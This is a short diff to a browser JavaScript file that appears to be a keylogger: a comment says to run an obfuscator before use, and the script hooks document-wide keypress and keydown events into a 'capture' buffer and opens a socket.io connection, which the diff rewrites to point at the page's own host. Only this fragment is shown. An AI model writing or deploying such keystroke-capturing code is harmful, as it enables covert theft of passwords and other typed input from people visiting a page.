@@ -2,7 +2,7 @@
 // run uglify-js or some other obfuscator before using
 //
 (function() {
-  var socket = io.connect(window.location);
+  var socket = io.connect('http://' + window.location.host);
   var capture = '';
   document.onkeypress = keypress;
   document.onkeydown = keydown;
